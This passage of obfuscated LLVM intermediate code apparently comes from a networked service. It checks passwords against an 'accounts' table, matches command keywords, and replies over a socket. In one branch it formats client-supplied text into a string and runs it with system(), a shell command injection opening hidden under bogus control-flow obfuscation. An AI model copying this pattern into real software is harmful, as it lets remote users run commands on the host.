  %2948 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2949 = call i64 @strlen(i8* %2948) #8
  %2950 = call i64 @send(i32 %2946, i8* %2947, i64 %2949, i32 16384)
  %2951 = icmp eq i64 %2950, -1
  %2952 = load i32, i32* @x.17
  %2953 = load i32, i32* @y.18
  %2954 = sub i32 %2952, 1
  %2955 = mul i32 %2952, %2954
  %2956 = urem i32 %2955, 2
  %2957 = icmp eq i32 %2956, 0
  %2958 = icmp slt i32 %2953, 10
  %2959 = or i1 %2957, %2958
  br i1 %2959, label %originalBBpart2356, label %originalBB354alteredBB

originalBBpart2356:                               ; preds = %originalBB354
  br i1 %2951, label %2960, label %2961

; <label>:2960:                                   ; preds = %originalBBpart2356
  store i8* null, i8** %2, align 8
  br label %4206

; <label>:2961:                                   ; preds = %originalBBpart2356
  br label %2989

; <label>:2962:                                   ; preds = %2916
  %2963 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2964 = call i32 (i8*, i8*, ...) @sprintf(i8* %2963, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.142, i32 0, i32 0)) #7
  %2965 = load i32, i32* %4, align 4
  %2966 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2967 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2968 = call i64 @strlen(i8* %2967) #8
  %2969 = call i64 @send(i32 %2965, i8* %2966, i64 %2968, i32 16384)
  %2970 = icmp eq i64 %2969, -1
  br i1 %2970, label %2971, label %2988

; <label>:2971:                                   ; preds = %2962
  %2972 = load i32, i32* @x.17
  %2973 = load i32, i32* @y.18
  %2974 = sub i32 %2972, 1
  %2975 = mul i32 %2972, %2974
  %2976 = urem i32 %2975, 2
  %2977 = icmp eq i32 %2976, 0
  %2978 = icmp slt i32 %2973, 10
  %2979 = or i1 %2977, %2978
  br i1 %2979, label %originalBB358, label %originalBB358alteredBB

originalBB358:                                    ; preds = %originalBB358alteredBB, %2971
  %2980 = load i32, i32* @x.17
  %2981 = load i32, i32* @y.18
  %2982 = sub i32 %2980, 1
  %2983 = mul i32 %2980, %2982
  %2984 = urem i32 %2983, 2
  %2985 = icmp eq i32 %2984, 0
  %2986 = icmp slt i32 %2981, 10
  %2987 = or i1 %2985, %2986
  br i1 %2987, label %originalBBpart2360, label %originalBB358alteredBB

originalBBpart2360:                               ; preds = %originalBB358
  br label %2988

; <label>:2988:                                   ; preds = %originalBBpart2360, %2962
  br label %2989

; <label>:2989:                                   ; preds = %2988, %2961
  br label %2990

; <label>:2990:                                   ; preds = %2989, %2912
  %2991 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2992 = call i8* @strstr(i8* %2991, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.143, i32 0, i32 0)) #8
  %2993 = icmp ne i8* %2992, null
  br i1 %2993, label %2998, label %2994

; <label>:2994:                                   ; preds = %2990
  %2995 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2996 = call i8* @strstr(i8* %2995, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.144, i32 0, i32 0)) #8
  %2997 = icmp ne i8* %2996, null
  br i1 %2997, label %2998, label %3071

; <label>:2998:                                   ; preds = %2994, %2990
  %2999 = load i8*, i8** %12, align 8
  %3000 = load i32, i32* %5, align 4
  %3001 = sext i32 %3000 to i64
  %3002 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %3001
  %3003 = getelementptr inbounds %struct.account, %struct.account* %3002, i32 0, i32 2
  %3004 = getelementptr inbounds [20 x i8], [20 x i8]* %3003, i32 0, i32 0
  %3005 = call i32 @strcmp(i8* %2999, i8* %3004) #8
  %3006 = icmp eq i32 %3005, 0
  br i1 %3006, label %3007, label %3043

; <label>:3007:                                   ; preds = %2998
  %3008 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3009 = call i8* @strtok(i8* %3008, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.140, i32 0, i32 0)) #7
  store i8* %3009, i8** %104, align 8
  %3010 = load i8*, i8** %104, align 8
  %3011 = getelementptr inbounds i8, i8* %3010, i64 8
  store i8* %3011, i8** %105, align 8
  %3012 = load i8*, i8** %105, align 8
  call void @trim(i8* %3012)
  %3013 = getelementptr inbounds [50 x i8*], [50 x i8*]* %106, i32 0, i32 0
  %3014 = bitcast i8** %3013 to i8*
  %3015 = load i8*, i8** %105, align 8
  %3016 = call i32 (i8*, i8*, ...) @sprintf(i8* %3014, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.145, i32 0, i32 0), i8* %3015) #7
  %3017 = getelementptr inbounds [50 x i8*], [50 x i8*]* %106, i32 0, i32 0
  %3018 = bitcast i8** %3017 to i8*
  %3019 = call i32 @system(i8* %3018)
  %3020 = load i32, i32* %5, align 4
  %3021 = sext i32 %3020 to i64
  %3022 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %3021
  %3023 = getelementptr inbounds %struct.account, %struct.account* %3022, i32 0, i32 0
  %3024 = getelementptr inbounds [20 x i8], [20 x i8]* %3023, i32 0, i32 0
  %3025 = load i8*, i8** %105, align 8
  %3026 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.146, i32 0, i32 0), i8* %3024, i8* %3025)
  %3027 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3028 = load i32, i32* %5, align 4
  %3029 = sext i32 %3028 to i64
  %3030 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %3029
  %3031 = getelementptr inbounds %struct.account, %struct.account* %3030, i32 0, i32 0
  %3032 = getelementptr inbounds [20 x i8], [20 x i8]* %3031, i32 0, i32 0
  %3033 = load i8*, i8** %105, align 8
  %3034 = call i32 (i8*, i8*, ...) @sprintf(i8* %3027, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.147, i32 0, i32 0), i8* %3032, i8* %3033) #7
  %3035 = load i32, i32* %4, align 4
  %3036 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3037 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3038 = call i64 @strlen(i8* %3037) #8
  %3039 = call i64 @send(i32 %3035, i8* %3036, i64 %3038, i32 16384)
  %3040 = icmp eq i64 %3039, -1
  br i1 %3040, label %3041, label %3042

; <label>:3041:                                   ; preds = %3007
  store i8* null, i8** %2, align 8
  br label %4206

; <label>:3042:                                   ; preds = %3007
  br label %3070

; <label>:3043:                                   ; preds = %2998
  %3044 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3045 = call i32 (i8*, i8*, ...) @sprintf(i8* %3044, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.142, i32 0, i32 0)) #7
  %3046 = load i32, i32* %4, align 4
  %3047 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3048 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3049 = call i64 @strlen(i8* %3048) #8
  %3050 = call i64 @send(i32 %3046, i8* %3047, i64 %3049, i32 16384)
  %3051 = icmp eq i64 %3050, -1
  br i1 %3051, label %3052, label %3069

; <label>:3052:                                   ; preds = %3043
  %3053 = load i32, i32* @x.17
  %3054 = load i32, i32* @y.18
  %3055 = sub i32 %3053, 1
  %3056 = mul i32 %3053, %3055
  %3057 = urem i32 %3056, 2
  %3058 = icmp eq i32 %3057, 0
  %3059 = icmp slt i32 %3054, 10
  %3060 = or i1 %3058, %3059
  br i1 %3060, label %originalBB362, label %originalBB362alteredBB

originalBB362:                                    ; preds = %originalBB362alteredBB, %3052
  %3061 = load i32, i32* @x.17
  %3062 = load i32, i32* @y.18
  %3063 = sub i32 %3061, 1
  %3064 = mul i32 %3061, %3063
  %3065 = urem i32 %3064, 2
  %3066 = icmp eq i32 %3065, 0
  %3067 = icmp slt i32 %3062, 10
  %3068 = or i1 %3066, %3067
  br i1 %3068, label %originalBBpart2364, label %originalBB362alteredBB

originalBBpart2364:                               ; preds = %originalBB362
  br label %3069

; <label>:3069:                                   ; preds = %originalBBpart2364, %3043
  br label %3070

; <label>:3070:                                   ; preds = %3069, %3042
  br label %3071

; <label>:3071:                                   ; preds = %3070, %2994
  %3072 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3073 = call i8* @strstr(i8* %3072, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.148, i32 0, i32 0)) #8
  %3074 = icmp ne i8* %3073, null
  br i1 %3074, label %3075, label %3118

; <label>:3075:                                   ; preds = %3071
  %3076 = load i32, i32* @x.17
  %3077 = load i32, i32* @y.18
  %3078 = sub i32 %3076, 1
  %3079 = mul i32 %3076, %3078
  %3080 = urem i32 %3079, 2
  %3081 = icmp eq i32 %3080, 0
  %3082 = icmp slt i32 %3077, 10
  %3083 = or i1 %3081, %3082
  br i1 %3083, label %originalBB366, label %originalBB366alteredBB

originalBB366:                                    ; preds = %originalBB366alteredBB, %3075
  %3084 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3085 = call i32 (i8*, i8*, ...) @sprintf(i8* %3084, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.149, i32 0, i32 0)) #7
  %3086 = load i32, i32* %4, align 4
  %3087 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3088 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3089 = call i64 @strlen(i8* %3088) #8
  %3090 = call i64 @send(i32 %3086, i8* %3087, i64 %3089, i32 16384)
  %3091 = icmp eq i64 %3090, -1
  %3092 = load i32, i32* @x.17
  %3093 = load i32, i32* @y.18
  %3094 = sub i32 %3092, 1
  %3095 = mul i32 %3092, %3094
  %3096 = urem i32 %3095, 2
  %3097 = icmp eq i32 %3096, 0
  %3098 = icmp slt i32 %3093, 10
  %3099 = or i1 %3097, %3098
  br i1 %3099, label %originalBBpart2368, label %originalBB366alteredBB

originalBBpart2368:                               ; preds = %originalBB366
  br i1 %3091, label %3100, label %3117

; <label>:3100:                                   ; preds = %originalBBpart2368
  %3101 = load i32, i32* @x.17
  %3102 = load i32, i32* @y.18
  %3103 = sub i32 %3101, 1
  %3104 = mul i32 %3101, %3103
  %3105 = urem i32 %3104, 2
  %3106 = icmp eq i32 %3105, 0
  %3107 = icmp slt i32 %3102, 10
  %3108 = or i1 %3106, %3107
  br i1 %3108, label %originalBB370, label %originalBB370alteredBB

originalBB370:                                    ; preds = %originalBB370alteredBB, %3100
  store i8* null, i8** %2, align 8
  %3109 = load i32, i32* @x.17
  %3110 = load i32, i32* @y.18
  %3111 = sub i32 %3109, 1
  %3112 = mul i32 %3109, %3111
  %3113 = urem i32 %3112, 2
  %3114 = icmp eq i32 %3113, 0
  %3115 = icmp slt i32 %3110, 10
  %3116 = or i1 %3114, %3115
  br i1 %3116, label %originalBBpart2372, label %originalBB370alteredBB

originalBBpart2372:                               ; preds = %originalBB370
  br label %4206

; <label>:3117:                                   ; preds = %originalBBpart2368
  br label %3118

; <label>:3118:                                   ; preds = %3117, %3071
  %3119 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3120 = call i8* @strstr(i8* %3119, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.150, i32 0, i32 0)) #8
  %3121 = icmp ne i8* %3120, null
  br i1 %3121, label %3122, label %3133

; <label>:3122:                                   ; preds = %3118
  %3123 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3124 = call i32 (i8*, i8*, ...) @sprintf(i8* %3123, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.151, i32 0, i32 0)) #7
  %3125 = load i32, i32* %4, align 4
  %3126 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3127 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3128 = call i64 @strlen(i8* %3127) #8
  %3129 = call i64 @send(i32 %3125, i8* %3126, i64 %3128, i32 16384)
  %3130 = icmp eq i64 %3129, -1
  br i1 %3130, label %3131, label %3132

; <label>:3131:                                   ; preds = %3122
  store i8* null, i8** %2, align 8
  br label %4206

; <label>:3132:                                   ; preds = %3122
  br label %3133

; <label>:3133:                                   ; preds = %3132, %3118
  %3134 = load i32, i32* @x.17
  %3135 = load i32, i32* @y.18
  %3136 = sub i32 %3134, 1
  %3137 = mul i32 %3134, %3136
  %3138 = urem i32 %3137, 2
  %3139 = icmp eq i32 %3138, 0
  %3140 = icmp slt i32 %3135, 10
  %3141 = or i1 %3139, %3140
  br i1 %3141, label %originalBB374, label %originalBB374alteredBB

originalBB374:                                    ; preds = %originalBB374alteredBB, %3133
  %3142 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3143 = call i8* @strstr(i8* %3142, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.152, i32 0, i32 0)) #8
  %3144 = icmp ne i8* %3143, null
  %3145 = load i32, i32* @x.17
  %3146 = load i32, i32* @y.18
  %3147 = sub i32 %3145, 1
  %3148 = mul i32 %3145, %3147
  %3149 = urem i32 %3148, 2
  %3150 = icmp eq i32 %3149, 0
  %3151 = icmp slt i32 %3146, 10
  %3152 = or i1 %3150, %3151
  br i1 %3152, label %originalBBpart2376, label %originalBB374alteredBB

originalBBpart2376:                               ; preds = %originalBB374
  br i1 %3144, label %3153, label %3180

; <label>:3153:                                   ; preds = %originalBBpart2376
  %3154 = load i32, i32* @x.17
  %3155 = load i32, i32* @y.18
  %3156 = sub i32 %3154, 1
  %3157 = mul i32 %3154, %3156
  %3158 = urem i32 %3157, 2
  %3159 = icmp eq i32 %3158, 0
  %3160 = icmp slt i32 %3155, 10
  %3161 = or i1 %3159, %3160
  br i1 %3161, label %originalBB378, label %originalBB378alteredBB

originalBB378:                                    ; preds = %originalBB378alteredBB, %3153
  %3162 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3163 = call i32 (i8*, i8*, ...) @sprintf(i8* %3162, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.151, i32 0, i32 0)) #7
  %3164 = load i32, i32* %4, align 4
  %3165 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3166 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3167 = call i64 @strlen(i8* %3166) #8
  %3168 = call i64 @send(i32 %3164, i8* %3165, i64 %3167, i32 16384)
  %3169 = icmp eq i64 %3168, -1
  %3170 = load i32, i32* @x.17
  %3171 = load i32, i32* @y.18
  %3172 = sub i32 %3170, 1
  %3173 = mul i32 %3170, %3172
  %3174 = urem i32 %3173, 2
  %3175 = icmp eq i32 %3174, 0
  %3176 = icmp slt i32 %3171, 10
  %3177 = or i1 %3175, %3176
  br i1 %3177, label %originalBBpart2380, label %originalBB378alteredBB

originalBBpart2380:                               ; preds = %originalBB378
  br i1 %3169, label %3178, label %3179

; <label>:3178:                                   ; preds = %originalBBpart2380
  store i8* null, i8** %2, align 8
  br label %4206

; <label>:3179:                                   ; preds = %originalBBpart2380
  br label %3180

; <label>:3180:                                   ; preds = %3179, %originalBBpart2376
  %3181 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3182 = call i8* @strstr(i8* %3181, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.153, i32 0, i32 0)) #8
  %3183 = icmp ne i8* %3182, null
  br i1 %3183, label %3184, label %3195

; <label>:3184:                                   ; preds = %3180
  %3185 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3186 = call i32 (i8*, i8*, ...) @sprintf(i8* %3185, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.151, i32 0, i32 0)) #7
  %3187 = load i32, i32* %4, align 4
  %3188 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3189 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3190 = call i64 @strlen(i8* %3189) #8
  %3191 = call i64 @send(i32 %3187, i8* %3188, i64 %3190, i32 16384)
  %3192 = icmp eq i64 %3191, -1
  br i1 %3192, label %3193, label %3194

; <label>:3193:                                   ; preds = %3184
  store i8* null, i8** %2, align 8
  br label %4206

; <label>:3194:                                   ; preds = %3184
  br label %3195

; <label>:3195:                                   ; preds = %3194, %3180
  %3196 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3197 = call i8* @strstr(i8* %3196, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.154, i32 0, i32 0)) #8
  %3198 = icmp ne i8* %3197, null
  br i1 %3198, label %3199, label %3210

; <label>:3199:                                   ; preds = %3195
  %3200 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3201 = call i32 (i8*, i8*, ...) @sprintf(i8* %3200, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.155, i32 0, i32 0)) #7
  %3202 = load i32, i32* %4, align 4
  %3203 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3204 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3205 = call i64 @strlen(i8* %3204) #8
  %3206 = call i64 @send(i32 %3202, i8* %3203, i64 %3205, i32 16384)
  %3207 = icmp eq i64 %3206, -1
  br i1 %3207, label %3208, label %3209

; <label>:3208:                                   ; preds = %3199
  store i8* null, i8** %2, align 8
  br label %4206

; <label>:3209:                                   ; preds = %3199
  br label %3210

; <label>:3210:                                   ; preds = %3209, %3195
  %3211 = load i32, i32* @x.17
  %3212 = load i32, i32* @y.18
  %3213 = sub i32 %3211, 1
  %3214 = mul i32 %3211, %3213
  %3215 = urem i32 %3214, 2
  %3216 = icmp eq i32 %3215, 0
  %3217 = icmp slt i32 %3212, 10
  %3218 = or i1 %3216, %3217
  br i1 %3218, label %originalBB382, label %originalBB382alteredBB

originalBB382:                                    ; preds = %originalBB382alteredBB, %3210
  %3219 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3220 = call i8* @strstr(i8* %3219, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.156, i32 0, i32 0)) #8
  %3221 = icmp ne i8* %3220, null
  %3222 = load i32, i32* @x.17
  %3223 = load i32, i32* @y.18
  %3224 = sub i32 %3222, 1
  %3225 = mul i32 %3222, %3224
  %3226 = urem i32 %3225, 2
  %3227 = icmp eq i32 %3226, 0
  %3228 = icmp slt i32 %3223, 10
  %3229 = or i1 %3227, %3228
  br i1 %3229, label %originalBBpart2384, label %originalBB382alteredBB

originalBBpart2384:                               ; preds = %originalBB382
  br i1 %3221, label %3230, label %3257

; <label>:3230:                                   ; preds = %originalBBpart2384
  %3231 = load i32, i32* @x.17
  %3232 = load i32, i32* @y.18
  %3233 = sub i32 %3231, 1
  %3234 = mul i32 %3231, %3233
  %3235 = urem i32 %3234, 2
  %3236 = icmp eq i32 %3235, 0
  %3237 = icmp slt i32 %3232, 10
  %3238 = or i1 %3236, %3237
  br i1 %3238, label %originalBB386, label %originalBB386alteredBB

originalBB386:                                    ; preds = %originalBB386alteredBB, %3230
  %3239 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3240 = call i32 (i8*, i8*, ...) @sprintf(i8* %3239, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.157, i32 0, i32 0)) #7
  %3241 = load i32, i32* %4, align 4
  %3242 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3243 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3244 = call i64 @strlen(i8* %3243) #8
  %3245 = call i64 @send(i32 %3241, i8* %3242, i64 %3244, i32 16384)
  %3246 = icmp eq i64 %3245, -1
  %3247 = load i32, i32* @x.17
  %3248 = load i32, i32* @y.18
  %3249 = sub i32 %3247, 1
  %3250 = mul i32 %3247, %3249
  %3251 = urem i32 %3250, 2
  %3252 = icmp eq i32 %3251, 0
  %3253 = icmp slt i32 %3248, 10
  %3254 = or i1 %3252, %3253
  br i1 %3254, label %originalBBpart2388, label %originalBB386alteredBB

originalBBpart2388:                               ; preds = %originalBB386
  br i1 %3246, label %3255, label %3256

; <label>:3255:                                   ; preds = %originalBBpart2388
  store i8* null, i8** %2, align 8
  br label %4206

; <label>:3256:                                   ; preds = %originalBBpart2388
  br label %3257

; <label>:3257:                                   ; preds = %3256, %originalBBpart2384
  %3258 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3259 = call i8* @strstr(i8* %3258, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.158, i32 0, i32 0)) #8
  %3260 = icmp ne i8* %3259, null
  br i1 %3260, label %3261, label %3272

; <label>:3261:                                   ; preds = %3257
  %3262 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3263 = call i32 (i8*, i8*, ...) @sprintf(i8* %3262, i8* getelementptr inbounds ([124 x i8], [124 x i8]* @.str.159, i32 0, i32 0)) #7
  %3264 = load i32, i32* %4, align 4
  %3265 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3266 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3267 = call i64 @strlen(i8* %3266) #8
  %3268 = call i64 @send(i32 %3264, i8* %3265, i64 %3267, i32 16384)
  %3269 = icmp eq i64 %3268, -1
  br i1 %3269, label %3270, label %3271

; <label>:3270:                                   ; preds = %3261
  store i8* null, i8** %2, align 8
  br label %4206

; <label>:3271:                                   ; preds = %3261
  br label %3272

; <label>:3272:                                   ; preds = %3271, %3257
  %3273 = load i32, i32* @x.17
  %3274 = load i32, i32* @y.18
  %3275 = sub i32 %3273, 1
  %3276 = mul i32 %3273, %3275
  %3277 = urem i32 %3276, 2
  %3278 = icmp eq i32 %3277, 0
  %3279 = icmp slt i32 %3274, 10
  %3280 = or i1 %3278, %3279
  br i1 %3280, label %originalBB390, label %originalBB390alteredBB

originalBB390:                                    ; preds = %originalBB390alteredBB, %3272
  %3281 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3282 = call i8* @strstr(i8* %3281, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.160, i32 0, i32 0)) #8
  %3283 = icmp ne i8* %3282, null
  %3284 = load i32, i32* @x.17
  %3285 = load i32, i32* @y.18
  %3286 = sub i32 %3284, 1
  %3287 = mul i32 %3284, %3286
  %3288 = urem i32 %3287, 2
  %3289 = icmp eq i32 %3288, 0
  %3290 = icmp slt i32 %3285, 10
  %3291 = or i1 %3289, %3290
  br i1 %3291, label %originalBBpart2392, label %originalBB390alteredBB

originalBBpart2392:                               ; preds = %originalBB390
  br i1 %3283, label %3292, label %3319

; <label>:3292:                                   ; preds = %originalBBpart2392
  %3293 = load i32, i32* @x.17
  %3294 = load i32, i32* @y.18
  %3295 = sub i32 %3293, 1
  %3296 = mul i32 %3293, %3295
  %3297 = urem i32 %3296, 2
  %3298 = icmp eq i32 %3297, 0
  %3299 = icmp slt i32 %3294, 10
  %3300 = or i1 %3298, %3299
  br i1 %3300, label %originalBB394, label %originalBB394alteredBB

originalBB394:                                    ; preds = %originalBB394alteredBB, %3292
  %3301 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3302 = call i32 (i8*, i8*, ...) @sprintf(i8* %3301, i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.161, i32 0, i32 0)) #7
  %3303 = load i32, i32* %4, align 4
  %3304 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3305 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3306 = call i64 @strlen(i8* %3305) #8
  %3307 = call i64 @send(i32 %3303, i8* %3304, i64 %3306, i32 16384)
  %3308 = icmp eq i64 %3307, -1
  %3309 = load i32, i32* @x.17
  %3310 = load i32, i32* @y.18
  %3311 = sub i32 %3309, 1
  %3312 = mul i32 %3309, %3311
  %3313 = urem i32 %3312, 2
  %3314 = icmp eq i32 %3313, 0
  %3315 = icmp slt i32 %3310, 10
  %3316 = or i1 %3314, %3315
  br i1 %3316, label %originalBBpart2396, label %originalBB394alteredBB

originalBBpart2396:                               ; preds = %originalBB394
  br i1 %3308, label %3317, label %3318

; <label>:3317:                                   ; preds = %originalBBpart2396
  store i8* null, i8** %2, align 8
  br label %4206

; <label>:3318:                                   ; preds = %originalBBpart2396
  br label %3319

; <label>:3319:                                   ; preds = %3318, %originalBBpart2392
  %3320 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3321 = call i8* @strstr(i8* %3320, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.162, i32 0, i32 0)) #8
  %3322 = icmp ne i8* %3321, null
  br i1 %3322, label %3323, label %3350

; <label>:3323:                                   ; preds = %3319
  %3324 = load i32, i32* @x.17
  %3325 = load i32, i32* @y.18
  %3326 = sub i32 %3324, 1
  %3327 = mul i32 %3324, %3326
  %3328 = urem i32 %3327, 2
  %3329 = icmp eq i32 %3328, 0
  %3330 = icmp slt i32 %3325, 10
  %3331 = or i1 %3329, %3330
  br i1 %3331, label %originalBB398, label %originalBB398alteredBB

originalBB398:                                    ; preds = %originalBB398alteredBB, %3323
  %3332 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3333 = call i32 (i8*, i8*, ...) @sprintf(i8* %3332, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.163, i32 0, i32 0)) #7
  %3334 = load i32, i32* %4, align 4
  %3335 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3336 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3337 = call i64 @strlen(i8* %3336) #8
  %3338 = call i64 @send(i32 %3334, i8* %3335, i64 %3337, i32 16384)
  %3339 = icmp eq i64 %3338, -1
  %3340 = load i32, i32* @x.17
  %3341 = load i32, i32* @y.18
  %3342 = sub i32 %3340, 1
  %3343 = mul i32 %3340, %3342
  %3344 = urem i32 %3343, 2
  %3345 = icmp eq i32 %3344, 0
  %3346 = icmp slt i32 %3341, 10
  %3347 = or i1 %3345, %3346
  br i1 %3347, label %originalBBpart2400, label %originalBB398alteredBB

originalBBpart2400:                               ; preds = %originalBB398
  br i1 %3339, label %3348, label %3349

; <label>:3348:                                   ; preds = %originalBBpart2400
  store i8* null, i8** %2, align 8
  br label %4206

; <label>:3349:                                   ; preds = %originalBBpart2400
  br label %3350

; <label>:3350:                                   ; preds = %3349, %3319
  %3351 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %3352 = call i8* @strstr(i8* %3351, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.164, i32 0, i32 0)) #8
  %3353 = icmp ne i8* %3352, null
  br i1 %3353, label %3354, label %3413

; <label>:3354:                                   ; preds = %3350
  %3355 = load i32, i32* @x.17
  %3356 = load i32, i32* @y.18
  %3357 = sub i32 %3355, 1
  %3358 = mul i32 %3355, %3357
  %3359 = urem i32 %3358, 2
  %3360 = icmp eq i32 %3359, 0
  %3361 = icmp slt i32 %3356, 10
  %3362 = or i1 %3360, %3361
  br i1 %3362, label %originalBB402, label %originalBB402alteredBB

originalBB402:                                    ; preds = %originalBB402alteredBB, %3354
  %3363 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3364 = call i32 (i8*, i8*, ...) @sprintf(i8* %3363, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.165, i32 0, i32 0)) #7
  %3365 = load i32, i32* %4, align 4
  %3366 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3367 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %3368 = call i64 @strlen(i8* %3367) #8
  %3369 = call i64 @send(i32 %3365, i8* %3366, i64 %3368, i32 16384)
  %3370 = icmp eq i64 %3369, -1
  %3371 = load i32, i32* @x.17
  %3372 = load i32, i32* @y.18
  %3373 = sub i32 %3371, 1
  %3374 = mul i32 %3371, %3373
  %3375 = urem i32 %3374, 2
  %3376 = icmp eq i32 %3375, 0
  %3377 = icmp slt i32 %3372, 10
  %3378 = or i1 %3376, %3377
  br i1 %3378, label %originalBBpart2404, label %originalBB402alteredBB

originalBBpart2404:                               ; preds = %originalBB402
  br i1 %3370, label %3379, label %3396

; <label>:3379:                                   ; preds = %originalBBpart2404
  %3380 = load i32, i32* @x.17
  %3381 = load i32, i32* @y.18
  %3382 = sub i32 %3380, 1
  %3383 = mul i32 %3380, %3382
  %3384 = urem i32 %3383, 2
  %3385 = icmp eq i32 %3384, 0
  %3386 = icmp slt i32 %3381, 10
  %3387 = or i1 %3385, %3386
  br i1 %3387, label %originalBB406, label %originalBB406alteredBB

originalBB406:                                    ; preds = %originalBB406alteredBB, %3379
  store i8* null, i8** %2, align 8
  %3388 = load i32, i32* @x.17
  %3389 = load i32, i32* @y.18
  %3390 = sub i32 %3388, 1
  %3391 = mul i32 %3388, %3390
  %3392 = urem i32 %3391, 2
  %3393 = icmp eq i32 %3392, 0
  %3394 = icmp slt i32 %3389, 10
